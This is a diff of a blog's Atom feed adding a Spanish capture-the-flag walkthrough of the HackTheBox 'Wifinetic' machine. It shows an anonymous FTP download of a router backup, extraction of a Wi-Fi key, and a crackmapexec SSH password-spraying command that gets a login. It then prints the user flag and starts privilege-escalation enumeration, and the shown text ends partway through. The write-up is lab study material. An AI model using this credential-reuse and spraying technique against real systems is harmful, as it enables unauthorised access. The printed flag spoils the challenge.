@@ -1,5 +1,784 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-02T15:24:28-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Inject (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html" rel="alternate" type="text/html" title="HackTheBox - Inject (easy)" /><published>2024-06-02T00:00:00-06:00</published><updated>2024-06-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-05T18:59:24-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Wifinetic (easy)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html" rel="alternate" type="text/html" title="HackTheBox - Wifinetic (easy)" /><published>2024-06-05T00:00:00-06:00</published><updated>2024-06-05T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/4aaf2ad33bea830079d74497f8e7fefc.png" />
+</p>
+
+<ul>
+  <li>Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos haciendo un escaneo de puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,53 10.10.11.247 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-05 12:21 CST
+Nmap scan report <span class="k">for </span>10.10.11.247
+Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE    VERSION
+21/tcp open  ftp        vsftpd 3.0.3
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.14.2
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| <span class="nt">-rw-r--r--</span>    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
+| <span class="nt">-rw-r--r--</span>    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
+| <span class="nt">-rw-r--r--</span>    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
+| <span class="nt">-rw-r--r--</span>    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
+|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
+22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
+53/tcp open  tcpwrapped
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Si analizamos el escaneo vemos que tenemos puerto el puerto <strong>21</strong> que corresponde al servicio <strong>FTP</strong> el cual podemos conectarnos usando un <code class="language-plaintext highlighter-rouge">Anonymous FTP login</code> ya que esta habilitado además de que nos comparten archivos <code class="language-plaintext highlighter-rouge">pdf, tar y txt</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ftp 10.10.11.247
+Connected to 10.10.11.247.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.11.247:miguel<span class="o">)</span>: anonymous
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">dir
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|40843|<span class="o">)</span>
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
+226 Directory send OK.
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a descargarnos todo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; prompt off
+Interactive mode off.
+ftp&gt; mget <span class="k">*</span>
+<span class="nb">local</span>: MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
+229 Entering Extended Passive Mode <span class="o">(||</span>|47292|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>MigrateOpenWrt.txt <span class="o">(</span>4434 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************************************************************************************************</span>|  4434       25.02 MiB/s    00:00 ETA
+226 Transfer complete.
+4434 bytes received <span class="k">in </span>00:00 <span class="o">(</span>48.57 KiB/s<span class="o">)</span>
+<span class="nb">local</span>: ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
+229 Entering Extended Passive Mode <span class="o">(||</span>|47722|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>ProjectGreatMigration.pdf <span class="o">(</span>2501210 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************************************************************************************************</span>|  2442 KiB  649.31 KiB/s    00:00 ETA
+226 Transfer complete.
+2501210 bytes received <span class="k">in </span>00:03 <span class="o">(</span>634.83 KiB/s<span class="o">)</span>
+<span class="nb">local</span>: ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
+229 Entering Extended Passive Mode <span class="o">(||</span>|49450|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>ProjectOpenWRT.pdf <span class="o">(</span>60857 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************************************************************************************************</span>| 60857      322.21 KiB/s    00:00 ETA
+226 Transfer complete.
+60857 bytes received <span class="k">in </span>00:00 <span class="o">(</span>214.25 KiB/s<span class="o">)</span>
+<span class="nb">local</span>: backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
+229 Entering Extended Passive Mode <span class="o">(||</span>|47415|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>backup-OpenWrt-2023-07-26.tar <span class="o">(</span>40960 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************************************************************************************************</span>| 40960      368.09 KiB/s    00:00 ETA
+226 Transfer complete.
+40960 bytes received <span class="k">in </span>00:00 <span class="o">(</span>205.82 KiB/s<span class="o">)</span>
+<span class="nb">local</span>: employees_wellness.pdf remote: employees_wellness.pdf
+229 Entering Extended Passive Mode <span class="o">(||</span>|49749|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>employees_wellness.pdf <span class="o">(</span>52946 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************************************************************************************************</span>| 52946      300.96 KiB/s    00:00 ETA
+226 Transfer complete.
+52946 bytes received <span class="k">in </span>00:00 <span class="o">(</span>200.50 KiB/s<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>En el <strong>.txt</strong> nos hablan sobre <code class="language-plaintext highlighter-rouge">OpenWRT</code> <a href="https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/">https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>MigrateOpenWrt.txt
+  +-------------------------------------------------------+
+  |             Replace OpenWRT with Debian                |
+  +-------------------------------------------------------+
+  |                                                       |
+  |  +-----------------------------------------------+    |
+  |  |        Evaluate Current OpenWRT Setup        |    |
+  |  +-----------------------------------------------+    |
+  |                                                       |
+  |  +-----------------------------------------------+    |
+  |  |         Plan and Prepare the Migration       |    |
+  |  +-----------------------------------------------+    |
+  |  |                                               |    |
+  |  |   - Inventory current hardware and software   |    |
+  |  |   - Identify dependencies and customizations  |    |
+  |  |   - Research Debian-compatible alternatives   |    |
+  |  |   - Backup critical configurations and data   |    |
+  |  |                                               |    |
+  |  +-----------------------------------------------+    |
+  |                                                       |
+  |  +-----------------------------------------------+    |
+  |  |            Install Debian on Devices         |    |
+  |  +-----------------------------------------------+    |
+  |  |                                               |    |
+  |  |   - Obtain latest Debian release              |    |
+  |  |   - Check hardware compatibility              |    |
+  |  |   - Flash/install Debian on each device       |    |
+  |  |   - Verify successful installations           |    |
+  |  |                                               |    |
+  |  +-----------------------------------------------+    |
+  |                                                       |
+  |  +-----------------------------------------------+    |
+  |  |         Set Up Networking and Services       |    |
+  |  +-----------------------------------------------+    |
+  |  |                                               |    |
+  |  |   - Configure network interfaces              |    |
+  |  |   - Install and configure Wifi drivers        |    |
+  |  |   - Set up DHCP, DNS, and routing             |    |
+  |  |   - Install firewall and security measures    |    |
+  |  |   - Set up any additional services needed     |    |
+  |  |                                               |    |
+  |  +-----------------------------------------------+    |
+  |                                                       |
+  |  +-----------------------------------------------+    |
+  |  |           Migrate Configurations             |    |
+  |  +-----------------------------------------------+    |
+  |  |                                               |    |
+  |  |   - Adapt OpenWRT configurations to Debian    |    |
+  |  |   - Migrate custom settings and scripts       |    |
+  |  |   - Ensure compatibility with new system      |    |
+  |  |                                               |    |
+  |  +-----------------------------------------------+    |
+  |                                                       |
+  |  +-----------------------------------------------+    |
+  |  |          Test and Troubleshoot               |    |
+  |  +-----------------------------------------------+    |
+  |  |                                               |    |
+  |  |   - Test Wifi connectivity and performance    |    |
+  |  |   - Verify all services are functioning       |    |
+  |  |   - Address and resolve any issues            |    |
+  |  |   - Test <span class="k">for </span>security issues with Reaver tool |    |
+  |  |                                               |    |
+  |  +-----------------------------------------------+    |
+  |                                                       |
+  |  +-----------------------------------------------+    |
+  |  |         Monitor and Maintain                 |    |
+  |  +-----------------------------------------------+    |
+  |  |                                               |    |
+  |  |   - Implement regular updates and patches     |    |
+  |  |   - Monitor system health and performance     |    |
+  |  |   - Maintain and optimize the Debian system   |    |
+  |  |                                               |    |
+  |  +-----------------------------------------------+    |
+  |                                                       |
+  +-------------------------------------------------------+
+</code></pre></div></div>
+
+<ul>
+  <li>Si analizamos los <code class="language-plaintext highlighter-rouge">PDFs</code> encontramos información.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/wifinetic/1.png" />
+</p>
+
+<ul>
+  <li>Aquí hablan solo de un proyecto que tienen.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/wifinetic/2.png" />
+</p>
+
+<ul>
+  <li>Aquí nos hablan sobre la migración de <code class="language-plaintext highlighter-rouge">OpenWRT</code> para su red wifi y el <code class="language-plaintext highlighter-rouge">pdf</code> es del administrador de la red Oliver Walker.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/wifinetic/3.png" />
+</p>
+
+<ul>
+  <li>Pues bueno no encontramos nada interesante vamos analizar el <code class="language-plaintext highlighter-rouge">backup-OpenWrt-2023-07-26.tar</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap 7z x backup-OpenWrt-2023-07-26.tar
+
+7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
+ 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 40960 bytes <span class="o">(</span>40 KiB<span class="o">)</span>
+
+Extracting archive: backup-OpenWrt-2023-07-26.tar
+<span class="nt">--</span>
+Path <span class="o">=</span> backup-OpenWrt-2023-07-26.tar
+Type <span class="o">=</span> <span class="nb">tar
+</span>Physical Size <span class="o">=</span> 40960
+Headers Size <span class="o">=</span> 19968
+Code Page <span class="o">=</span> UTF-8
+Characteristics <span class="o">=</span> GNU ASCII
+
+Everything is Ok
+
+Folders: 7
+Files: 27
+Size:       13804
+Compressed: 40960
+</code></pre></div></div>
+
+<ul>
+  <li>Dentro del directorio <code class="language-plaintext highlighter-rouge">/etc</code> nos comparten muchos archivos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  etc tree
+<span class="nb">.</span>
+├── config
+│   ├── dhcp
+│   ├── dropbear
+│   ├── firewall
+│   ├── luci
+│   ├── network
+│   ├── rpcd
+│   ├── system
+│   ├── ucitrack
+│   ├── uhttpd
+│   └── wireless
+├── dropbear
+│   ├── dropbear_ed25519_host_key
+│   └── dropbear_rsa_host_key
+├── group
+├── hosts
+├── inittab
+├── luci-uploads
+├── nftables.d
+│   ├── 10-custom-filter-chains.nft
+│   └── README
+├── opkg
+│   └── keys
+│       └── 4d017e6f1ed5d616
+├── passwd
+├── profile
+├── rc.local
+├── shells
+├── shinit
+├── sysctl.conf
+├── uhttpd.crt
+└── uhttpd.key
+
+7 directories, 26 files
+</code></pre></div></div>
+
+<ul>
+  <li>En <code class="language-plaintext highlighter-rouge">wireless</code> encontramos una <code class="language-plaintext highlighter-rouge">key</code> para al parecer un <code class="language-plaintext highlighter-rouge">AP</code> con nombre <code class="language-plaintext highlighter-rouge">wifinet1, wifinet0</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  config <span class="nb">cat </span>wireless
+
+config wifi-device <span class="s1">'radio0'</span>
+	option <span class="nb">type</span> <span class="s1">'mac80211'</span>
+	option path <span class="s1">'virtual/mac80211_hwsim/hwsim0'</span>
+	option cell_density <span class="s1">'0'</span>
+	option channel <span class="s1">'auto'</span>
+	option band <span class="s1">'2g'</span>
+	option txpower <span class="s1">'20'</span>
+
+config wifi-device <span class="s1">'radio1'</span>
+	option <span class="nb">type</span> <span class="s1">'mac80211'</span>
+	option path <span class="s1">'virtual/mac80211_hwsim/hwsim1'</span>
+	option channel <span class="s1">'36'</span>
+	option band <span class="s1">'5g'</span>
+	option htmode <span class="s1">'HE80'</span>
+	option cell_density <span class="s1">'0'</span>
+
+config wifi-iface <span class="s1">'wifinet0'</span>
+	option device <span class="s1">'radio0'</span>
+	option mode <span class="s1">'ap'</span>
+	option ssid <span class="s1">'OpenWrt'</span>
+	option encryption <span class="s1">'psk'</span>
+	option key <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span>
+	option wps_pushbutton <span class="s1">'1'</span>
+
+config wifi-iface <span class="s1">'wifinet1'</span>
+	option device <span class="s1">'radio1'</span>
+	option mode <span class="s1">'sta'</span>
+	option network <span class="s1">'wwan'</span>
+	option ssid <span class="s1">'OpenWrt'</span>
+	option encryption <span class="s1">'psk'</span>
+	option key <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Aquí encontramos usuarios.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  etc <span class="nb">cat </span>group
+root:x:0:
+daemon:x:1:
+adm:x:4:
+mail:x:8:
+dialout:x:20:
+audio:x:29:
+www-data:x:33:
+ftp:x:55:
+<span class="nb">users</span>:x:100:
+network:x:101:network
+nogroup:x:65534:
+ntp:x:123:ntp
+dnsmasq:x:453:dnsmasq
+logd:x:514:logd
+ubus:x:81:ubus
+netadmin:!:999:
+</code></pre></div></div>
+
+<ul>
+  <li>Como tenemos una contraseña y nombres de varios usuarios hice una lista y con <code class="language-plaintext highlighter-rouge">crackmapexec</code> vi que usuarios usan la contraseña para autenticarse por <code class="language-plaintext highlighter-rouge">ssh</code> y el usuario <code class="language-plaintext highlighter-rouge">netadmin</code> la usa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>users.txt
+root
+adm
+mail
+network
+ntp
+netadmin
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ssh 10.10.11.247 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span> <span class="nt">--continue-on-success</span>
+SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span><span class="k">*</span><span class="o">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
+SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
+SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] adm:VeRyUniUqWiFIPasswrd1! Authentication failed.
+SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] mail:VeRyUniUqWiFIPasswrd1! Authentication failed.
+SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
+SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
+SSH         10.10.11.247    22     10.10.11.247     <span class="o">[</span>+] netadmin:VeRyUniUqWiFIPasswrd1!
+</code></pre></div></div>
+
+<h2 id="shell-as-netadmin-and-usertxt">Shell as netadmin and user.txt</h2>
+
+<ul>
+  <li>Ahora nos podemos conectar y ver la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ssh netadmin@10.10.11.247
+The authenticity of host <span class="s1">'10.10.11.247 (10.10.11.247)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.11.247<span class="s1">' (ED25519) to the list of known hosts.
+netadmin@10.10.11.247'</span>s password:
+Welcome to Ubuntu 20.04.6 LTS <span class="o">(</span>GNU/Linux 5.4.0-162-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 05 Jun 2024 06:45:43 PM UTC
+
+  System load:            0.04
+  Usage of /:             70.1% of 4.76GB
+  Memory usage:           12%
+  Swap usage:             0%
+  Processes:              228
+  Users logged <span class="k">in</span>:        0
+  IPv4 address <span class="k">for </span>eth0:  10.10.11.247
+  IPv6 address <span class="k">for </span>eth0:  dead:beef::250:56ff:feb9:e70f
+  IPv4 address <span class="k">for </span>wlan0: 192.168.1.1
+  IPv4 address <span class="k">for </span>wlan1: 192.168.1.23
+
+
+Expanded Security Maintenance <span class="k">for </span>Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: <span class="nb">sudo </span>pro status
+
+
+The list of available updates is more than a week old.
+To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jun  5 04:48:37 2024 from 10.10.16.6
+netadmin@wifinetic:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+netadmin@wifinetic:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+c1b267d58451fd704217588ece6ae83b
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>No vemos nada interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/snapd/snap-confine
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/openssh/ssh-keysign
+./usr/bin/mount
+./usr/bin/sudo
+./usr/bin/gpasswd
+./usr/bin/umount
+./usr/bin/passwd
+./usr/bin/fusermount
+./usr/bin/chsh
+./usr/bin/at
+./usr/bin/chfn
+./usr/bin/newgrp
+./usr/bin/su
+</code></pre></div></div>
+
+<ul>
+  <li>No tenemos ningún privilegio a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>netadmin:
+Sorry, user netadmin may not run <span class="nb">sudo </span>on wifinetic.
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos buscar por <code class="language-plaintext highlighter-rouge">capabilities</code> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a> la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> <a href="https://www.kali.org/tools/reaver/">https://www.kali.org/tools/reaver/</a> <a href="https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html">https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html</a> es utilizada para ataques wifi WPS.</li>
+</ul>
+
+<blockquote>
+  <p>El protocolo WPS (Wi-Fi Protected Setup) es un estándar de seguridad de redes diseñado para facilitar la configuración segura de una red inalámbrica Wi-Fi. Este protocolo permite a los usuarios conectar dispositivos a una red inalámbrica de forma segura y conveniente sin tener que ingresar una contraseña larga.</p>
+</blockquote>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/wifinetic/4.png" />
+</p>
+
+<ul>
+  <li>Tenemos 6 interfaces.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>ifconfig
+eth0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
+        inet6 dead:beef::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x0&lt;global&gt;
+        inet6 fe80::250:56ff:feb9:e70f  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
+        ether 00:50:56:b9:e7:0f  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 234991  bytes 14972570 <span class="o">(</span>14.9 MB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 213051  bytes 19724677 <span class="o">(</span>19.7 MB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
+        RX packets 148254  bytes 9637744 <span class="o">(</span>9.6 MB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 148254  bytes 9637744 <span class="o">(</span>9.6 MB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+mon0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  <span class="o">(</span>UNSPEC<span class="o">)</span>
+        RX packets 598684  bytes 105544453 <span class="o">(</span>105.5 MB<span class="o">)</span>
+        RX errors 0  dropped 598623  overruns 0  frame 0
+        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan0: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
+        ether 02:00:00:00:00:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 20246  bytes 1987658 <span class="o">(</span>1.9 MB<span class="o">)</span>
+        RX errors 0  dropped 2743  overruns 0  frame 0
+        TX packets 23375  bytes 2791153 <span class="o">(</span>2.7 MB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan1: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
+        ether 02:00:00:00:01:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 5862  bytes 815386 <span class="o">(</span>815.3 KB<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 20223  bytes 2348428 <span class="o">(</span>2.3 MB<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+wlan2: <span class="nv">flags</span><span class="o">=</span>4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
+        ether 02:00:00:00:02:00  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
+        RX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>La que mas llama la atención es <code class="language-plaintext highlighter-rouge">mon0</code> ya que cuando tenemos una antena y la ponemos en modo monitor suele llamarse <code class="language-plaintext highlighter-rouge">wlan0mon</code>.</p>
+  </li>
+  <li>
+    <p>Algo que podemos hacer es ver mas información acerca de las interfaces inalámbricas en el sistema.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>iw dev
+phy#2
+	Interface mon0
+		ifindex 7
+		wdev 0x200000002
+		addr 02:00:00:00:02:00
+		<span class="nb">type </span>monitor
+		txpower 20.00 dBm
+	Interface wlan2
+		ifindex 5
+		wdev 0x200000001
+		addr 02:00:00:00:02:00
+		<span class="nb">type </span>managed
+		txpower 20.00 dBm
+phy#1
+	Unnamed/non-netdev interface
+		wdev 0x10000056b
+		addr 42:00:00:00:01:00
